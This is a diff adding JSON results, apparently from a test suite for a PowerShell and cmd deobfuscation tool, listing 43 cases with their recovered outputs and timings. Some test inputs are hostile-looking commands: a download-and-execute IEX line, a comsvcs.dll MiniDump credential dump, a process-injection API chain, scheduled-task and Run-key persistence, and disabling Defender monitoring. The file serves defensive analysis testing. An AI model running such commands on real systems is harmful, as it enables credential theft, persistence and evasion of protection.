@@ -1,0 +1,698 @@
+{
+  "cases": 43,
+  "correct": 43,
+  "behavior_cases": 7,
+  "behavior_correct": 7,
+  "recipe_correct": 43,
+  "peak_process_rss_kib": 26240,
+  "results": [
+    {
+      "name": "utf8",
+      "policy": "full",
+      "correct": true,
+      "behavior_correct": true,
+      "recipe_correct": true,
+      "status": "RECOVERED",
+      "output": {
+        "format": "text",
+        "value": "Write-Output 'hello'"
+      },
+      "canonical": true,
+      "latency_ms": 158.822,
+      "nodes": 3,
+      "generated_bytes": 40
+    },
+    {
+      "name": "utf16le",
+      "policy": "full",
+      "correct": true,
+      "behavior_correct": true,
+      "recipe_correct": true,
+      "status": "RECOVERED",
+      "output": {
+        "format": "text",
+        "value": "Write-Output 'hello'"
+      },
+      "canonical": true,
+      "latency_ms": 0.569,
+      "nodes": 3,
+      "generated_bytes": 60
+    },
+    {
+      "name": "gzip",
+      "policy": "full",
+      "correct": true,
+      "behavior_correct": true,
+      "recipe_correct": true,
+      "status": "RECOVERED",
+      "output": {
+        "format": "text",
+        "value": "Write-Output 'hello'"
+      },
+      "canonical": true,
+      "latency_ms": 0.528,
+      "nodes": 4,
+      "generated_bytes": 80
+    },
+    {
+      "name": "zlib",
+      "policy": "full",
+      "correct": true,
+      "behavior_correct": true,
+      "recipe_correct": true,
+      "status": "RECOVERED",
+      "output": {
+        "format": "text",
+        "value": "Write-Output 'hello'"
+      },
+      "canonical": true,
+      "latency_ms": 0.472,
+      "nodes": 4,
+      "generated_bytes": 68
+    },
+    {
+      "name": "nested",
+      "policy": "full",
+      "correct": true,
+      "behavior_correct": true,
+      "recipe_correct": true,
+      "status": "RECOVERED",
+      "output": {
+        "format": "text",
+        "value": "Write-Output 'hello'"
+      },
+      "canonical": true,
+      "latency_ms": 0.807,
+      "nodes": 6,
+      "generated_bytes": 242
+    },
+    {
+      "name": "encodedcommand",
+      "policy": "full",
+      "correct": true,
+      "behavior_correct": true,
+      "recipe_correct": true,
+      "status": "RECOVERED",
+      "output": {
+        "format": "text",
+        "value": "Write-Output 'hello'"
+      },
+      "canonical": true,
+      "latency_ms": 0.846,
+      "nodes": 4,
+      "generated_bytes": 116
+    },
+    {
+      "name": "concat",
+      "policy": "full",
+      "correct": true,
+      "behavior_correct": true,
+      "recipe_correct": true,
+      "status": "RECOVERED",
+      "output": {
+        "format": "text",
+        "value": "Write-Output 'hello'"
+      },
+      "canonical": true,
+      "latency_ms": 0.836,
+      "nodes": 3,
+      "generated_bytes": 40
+    },
+    {
+      "name": "char_add",
+      "policy": "full",
+      "correct": true,
+      "behavior_correct": true,
+      "recipe_correct": true,
+      "status": "RECOVERED",
+      "output": {
+        "format": "text",
+        "value": "Write-Output 'hello'"
+      },
+      "canonical": true,
+      "latency_ms": 0.669,
+      "nodes": 3,
+      "generated_bytes": 40
+    },
+    {
+      "name": "frombase64_ast",
+      "policy": "full",
+      "correct": true,
+      "behavior_correct": true,
+      "recipe_correct": true,
+      "status": "RECOVERED",
+      "output": {
+        "format": "text",
+        "value": "Write-Output 'hello'"
+      },
+      "canonical": true,
+      "latency_ms": 0.772,
+      "nodes": 3,
+      "generated_bytes": 28
+    },
+    {
+      "name": "frombase64_variable",
+      "policy": "full",
+      "correct": true,
+      "behavior_correct": true,
+      "recipe_correct": true,
+      "status": "RECOVERED",
+      "output": {
+        "format": "text",
+        "value": "$b='aGVsbG8='; Write-Output 'hello'"
+      },
+      "canonical": true,
+      "latency_ms": 0.856,
+      "nodes": 2,
+      "generated_bytes": 35
+    },
+    {
+      "name": "char_array",
+      "policy": "full",
+      "correct": true,
+      "behavior_correct": true,
+      "recipe_correct": true,
+      "status": "RECOVERED",
+      "output": {
+        "format": "text",
+        "value": "Write-Output 'hello'"
+      },
+      "canonical": true,
+      "latency_ms": 0.47,
+      "nodes": 2,
+      "generated_bytes": 20
+    },
+    {
+      "name": "array_join",
+      "policy": "full",
+      "correct": true,
+      "behavior_correct": true,
+      "recipe_correct": true,
+      "status": "RECOVERED",
+      "output": {
+        "format": "text",
+        "value": "Write-Output 'hello'"
+      },
+      "canonical": true,
+      "latency_ms": 0.383,
+      "nodes": 2,
+      "generated_bytes": 20
+    },
+    {
+      "name": "format",
+      "policy": "full",
+      "correct": true,
+      "behavior_correct": true,
+      "recipe_correct": true,
+      "status": "RECOVERED",
+      "output": {
+        "format": "text",
+        "value": "Write-Output 'hello'"
+      },
+      "canonical": true,
+      "latency_ms": 0.547,
+      "nodes": 2,
+      "generated_bytes": 20
+    },
+    {
+      "name": "variables",
+      "policy": "full",
+      "correct": true,
+      "behavior_correct": true,
+      "recipe_correct": true,
+      "status": "RECOVERED",
+      "output": {
+        "format": "text",
+        "value": "$a='he'; $b='llo'; Write-Output 'hello'"
+      },
+      "canonical": true,
+      "latency_ms": 0.479,
+      "nodes": 2,
+      "generated_bytes": 39
+    },
+    {
+      "name": "variable_format",
+      "policy": "full",
+      "correct": true,
+      "behavior_correct": true,
+      "recipe_correct": true,
+      "status": "RECOVERED",
+      "output": {
+        "format": "text",
+        "value": "$a='hello'; Write-Output 'hello!'"
+      },
+      "canonical": true,
+      "latency_ms": 0.432,
+      "nodes": 2,
+      "generated_bytes": 33
+    },
+    {
+      "name": "xor",
+      "policy": "full",
+      "correct": true,
+      "behavior_correct": true,
+      "recipe_correct": true,
+      "status": "RECOVERED",
+      "output": {
+        "format": "text",
+        "value": "Write-Output 'hello'"
+      },
+      "canonical": true,
+      "latency_ms": 0.626,
+      "nodes": 2,
+      "generated_bytes": 20
+    },
+    {
+      "name": "subtract",
+      "policy": "full",
+      "correct": true,
+      "behavior_correct": true,
+      "recipe_correct": true,
+      "status": "RECOVERED",
+      "output": {
+        "format": "text",
+        "value": "Write-Output 'hello'"
+      },
+      "canonical": true,
+      "latency_ms": 0.59,
+      "nodes": 2,
+      "generated_bytes": 20
+    },
+    {
+      "name": "add",
+      "policy": "full",
+      "correct": true,
+      "behavior_correct": true,
+      "recipe_correct": true,
+      "status": "RECOVERED",
+      "output": {
+        "format": "text",
+        "value": "Write-Output 'hello'"
+      },
+      "canonical": true,
+      "latency_ms": 0.666,
+      "nodes": 2,
+      "generated_bytes": 20
+    },
+    {
+      "name": "hex_array",
+      "policy": "full",
+      "correct": true,
+      "behavior_correct": true,
+      "recipe_correct": true,
+      "status": "RECOVERED",
+      "output": {
+        "format": "text",
+        "value": "Write-Output 'hello'"
+      },
+      "canonical": true,
+      "latency_ms": 0.612,
+      "nodes": 2,
+      "generated_bytes": 20
+    },
+    {
+      "name": "cmd_carets",
+      "policy": "full",
+      "correct": true,
+      "behavior_correct": true,
+      "recipe_correct": true,
+      "status": "RECOVERED",
+      "output": {
+        "format": "text",
+        "value": "echo hello"
+      },
+      "canonical": true,
+      "latency_ms": 0.652,
+      "nodes": 2,
+      "generated_bytes": 10
+    },
+    {
+      "name": "cmd_nested",
+      "policy": "full",
+      "correct": true,
+      "behavior_correct": true,
+      "recipe_correct": true,
+      "status": "RECOVERED",
+      "output": {
+        "format": "text",
+        "value": "Write-Output 'hello'"
+      },
+      "canonical": true,
+      "latency_ms": 1.063,
+      "nodes": 8,
+      "generated_bytes": 304
+    },
+    {
+      "name": "cmd_delayed",
+      "policy": "full",
+      "correct": true,
+      "behavior_correct": true,
+      "recipe_correct": true,
+      "status": "RECOVERED",
+      "output": {
+        "format": "text",
+        "value": "cmd /v:on /c \"set x=hello&&echo hello\""
+      },
+      "canonical": true,
+      "latency_ms": 0.477,
+      "nodes": 2,
+      "generated_bytes": 38
+    },
+    {
+      "name": "cmd_percent",
+      "policy": "refuse",
+      "correct": true,
+      "behavior_correct": true,
+      "recipe_correct": true,
+      "status": "UNRECOVERED",
+      "output": {
+        "format": "text",
+        "value": "cmd /c \"set x=hello&&echo %x%\""
+      },
+      "canonical": false,
+      "latency_ms": 0.118,
+      "nodes": 1,
+      "generated_bytes": 0
+    },
+    {
+      "name": "cmd_unsafe",
+      "policy": "refuse",
+      "correct": true,
+      "behavior_correct": true,
+      "recipe_correct": true,
+      "status": "UNRECOVERED",
+      "output": {
+        "format": "text",
+        "value": "cmd /v:on /c \"set x=hello&whoami&&echo !x!\""
+      },
+      "canonical": false,
+      "latency_ms": 0.179,
+      "nodes": 1,
+      "generated_bytes": 0
+    },
+    {
+      "name": "embedded",
+      "policy": "partial",
+      "correct": true,
+      "behavior_correct": true,
+      "recipe_correct": true,
+      "status": "PARTIALLY_RECOVERED",
+      "output": {
+        "format": "text",
+        "value": "Write-Output 'hello'"
+      },
+      "canonical": false,
+      "latency_ms": 0.821,
+      "nodes": 4,
+      "generated_bytes": 68
+    },
+    {
+      "name": "unknown_variable",
+      "policy": "refuse",
+      "correct": true,
+      "behavior_correct": true,
+      "recipe_correct": true,
+      "status": "UNRECOVERED",
+      "output": {
+        "format": "text",
+        "value": "Write-Output $env:PATH"
+      },
+      "canonical": false,
+      "latency_ms": 0.129,
+      "nodes": 1,
+      "generated_bytes": 0
+    },
+    {
+      "name": "dynamic_call",
+      "policy": "refuse",
+      "correct": true,
+      "behavior_correct": true,
+      "recipe_correct": true,
+      "status": "NOT_REQUIRED",
+      "output": {
+        "format": "text",
+        "value": "IEX (Get-Content unknown.ps1)"
+      },
+      "canonical": false,
+      "latency_ms": 0.466,
+      "nodes": 1,
+      "generated_bytes": 0
+    },
+    {
+      "name": "loop_side_effect",
+      "policy": "refuse",
+      "correct": true,
+      "behavior_correct": true,
+      "recipe_correct": true,
+      "status": "UNRECOVERED",
+      "output": {
+        "format": "text",
+        "value": "Write-Output (-join (104,101 | ForEach-Object { Start-Process anything; [char]$_ }))"
+      },
+      "canonical": false,
+      "latency_ms": 0.394,
+      "nodes": 1,
+      "generated_bytes": 0
+    },
+    {
+      "name": "unknown_key",
+      "policy": "refuse",
+      "correct": true,
+      "behavior_correct": true,
+      "recipe_correct": true,
+      "status": "UNRECOVERED",
+      "output": {
+        "format": "text",
+        "value": "Write-Output (-join (111,98 | ForEach-Object { [char]($_ -bxor $key) }))"
+      },
+      "canonical": false,
+      "latency_ms": 0.506,
+      "nodes": 1,
+      "generated_bytes": 0
+    },
+    {
+      "name": "encrypted",
+      "policy": "refuse",
+      "correct": true,
+      "behavior_correct": true,
+      "recipe_correct": true,
+      "status": "UNRECOVERED",
+      "output": {
+        "format": "text",
+        "value": "[AES]::Decrypt($cipher,$key)"
+      },
+      "canonical": false,
+      "latency_ms": 0.204,
+      "nodes": 1,
+      "generated_bytes": 0
+    },
+    {
+      "name": "malformed",
+      "policy": "refuse",
+      "correct": true,
+      "behavior_correct": true,
+      "recipe_correct": true,
+      "status": "NOT_REQUIRED",
+      "output": {
+        "format": "text",
+        "value": "Write-Output ('abc"
+      },
+      "canonical": false,
+      "latency_ms": 0.134,
+      "nodes": 1,
+      "generated_bytes": 0
+    },
+    {
+      "name": "branch",
+      "policy": "refuse",
+      "correct": true,
+      "behavior_correct": true,
+      "recipe_correct": true,
+      "status": "UNRECOVERED",
+      "output": {
+        "format": "text",
+        "value": "$a='hello'; if($x){$a='bye'}; Write-Output $a"
+      },
+      "canonical": false,
+      "latency_ms": 0.235,
+      "nodes": 1,
+      "generated_bytes": 0
+    },
+    {
+      "name": "mixed_type",
+      "policy": "refuse",
+      "correct": true,
+      "behavior_correct": true,
+      "recipe_correct": true,
+      "status": "UNRECOVERED",
+      "output": {
+        "format": "text",
+        "value": "Write-Output ('x'+1)"
+      },
+      "canonical": false,
+      "latency_ms": 0.236,
+      "nodes": 1,
+      "generated_bytes": 0
+    },
+    {
+      "name": "truncated_gzip",
+      "policy": "partial",
+      "correct": true,
+      "behavior_correct": true,
+      "recipe_correct": true,
+      "status": "PARTIALLY_RECOVERED",
+      "output": {
+        "format": "text",
+        "value": "Write-Output 'hello'"
+      },
+      "canonical": false,
+      "latency_ms": 0.466,
+      "nodes": 4,
+      "generated_bytes": 76
+    },
+    {
+      "name": "plain_admin",
+      "policy": "plain",
+      "correct": true,
+      "behavior_correct": true,
+      "recipe_correct": true,
+      "status": "UNRECOVERED",
+      "output": {
+        "format": "text",
+        "value": "Get-Service"
+      },
+      "canonical": false,
+      "latency_ms": 0.198,
+      "nodes": 1,
+      "generated_bytes": 0
+    },
+    {
+      "name": "plain_output",
+      "policy": "plain",
+      "correct": true,
+      "behavior_correct": true,
+      "recipe_correct": true,
+      "status": "NOT_REQUIRED",
+      "output": {
+        "format": "text",
+        "value": "Write-Output 'hello'"
+      },
+      "canonical": false,
+      "latency_ms": 0.148,
+      "nodes": 1,
+      "generated_bytes": 0
+    },
+    {
+      "name": "quoted_behavior",
+      "policy": "plain",
+      "correct": true,
+      "behavior_correct": true,
+      "recipe_correct": true,
+      "status": "NOT_REQUIRED",
+      "output": {
+        "format": "text",
+        "value": "Write-Output 'IEX DownloadString VirtualAlloc schtasks'"
+      },
+      "canonical": false,
+      "latency_ms": 0.232,
+      "nodes": 1,
+      "generated_bytes": 0
+    },
+    {
+      "name": "download_expression",
+      "policy": "refuse",
+      "correct": true,
+      "behavior_correct": true,
+      "recipe_correct": true,
+      "status": "NOT_REQUIRED",
+      "output": {
+        "format": "text",
+        "value": "IEX (Invoke-WebRequest 'https://example.invalid/hello.ps1')"
+      },
+      "canonical": false,
+      "latency_ms": 0.292,
+      "nodes": 1,
+      "generated_bytes": 0
+    },
+    {
+      "name": "task",
+      "policy": "plain",
+      "correct": true,
+      "behavior_correct": true,
+      "recipe_correct": true,
+      "status": "NOT_REQUIRED",
+      "output": {
+        "format": "text",
+        "value": "schtasks /create /tn Demo /tr \"notepad.exe\" /sc ONLOGON"
+      },
+      "canonical": false,
+      "latency_ms": 0.218,
+      "nodes": 1,
+      "generated_bytes": 0
+    },
+    {
+      "name": "run_key",
+      "policy": "plain",
+      "correct": true,
+      "behavior_correct": true,
+      "recipe_correct": true,
+      "status": "NOT_REQUIRED",
+      "output": {
+        "format": "text",
+        "value": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Demo /d notepad.exe"
+      },
+      "canonical": false,
+      "latency_ms": 0.291,
+      "nodes": 1,
+      "generated_bytes": 0
+    },
+    {
+      "name": "credential",
+      "policy": "plain",
+      "correct": true,
+      "behavior_correct": true,
+      "recipe_correct": true,
+      "status": "NOT_REQUIRED",
+      "output": {
+        "format": "text",
+        "value": "rundll32.exe comsvcs.dll, MiniDump 123 C:\\Temp\\demo.dmp full"
+      },
+      "canonical": false,
+      "latency_ms": 0.225,
+      "nodes": 1,
+      "generated_bytes": 0
+    },
+    {
+      "name": "injection",
+      "policy": "plain",
+      "correct": true,
+      "behavior_correct": true,
+      "recipe_correct": true,
+      "status": "NOT_REQUIRED",
+      "output": {
+        "format": "text",
+        "value": "[Native]::VirtualAlloc(); [Native]::WriteProcessMemory(); [Native]::CreateRemoteThread()"
+      },
+      "canonical": false,
+      "latency_ms": 0.37,
+      "nodes": 1,
+      "generated_bytes": 0
+    },
+    {
+      "name": "defense",
+      "policy": "refuse",
+      "correct": true,
+      "behavior_correct": true,
+      "recipe_correct": true,
+      "status": "UNRECOVERED",
+      "output": {
+        "format": "text",
+        "value": "Set-MpPreference -DisableRealtimeMonitoring $true"
+      },
+      "canonical": false,
+      "latency_ms": 0.19,
+      "nodes": 1,
+      "generated_bytes": 0
+    }
+  ]
+}
